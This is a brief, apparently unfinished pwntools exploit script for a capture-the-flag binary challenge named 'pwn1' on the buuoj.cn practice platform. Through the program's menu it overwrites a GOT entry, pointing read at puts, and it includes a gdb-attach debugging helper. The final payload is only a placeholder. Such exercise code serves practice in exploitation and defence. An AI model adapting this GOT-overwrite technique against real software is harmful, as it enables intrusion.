# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = './pwn1'
libc = ELF('./libc-2.23.so')
elf = ELF(proc_name)

islocal = 1
if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 26809)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

read_plt = 0x601028
put_plt = 0x601018
def pwn():
    p.sendlineafter("your choice\n", "0")
    p.sendlineafter("address:\n", p64(read_plt))
    p.sendafter("content:\n", p64(put_plt))
    print(p64(read_plt))
    debug(0)
    p.sendlineafter("your choice\n", "1")
    p.sendlineafter("size:\n", "300")

    payload = 'a'
    p.sendlineafter("content:\n", payload)
    
if __name__ == '__main__':
    pwn()
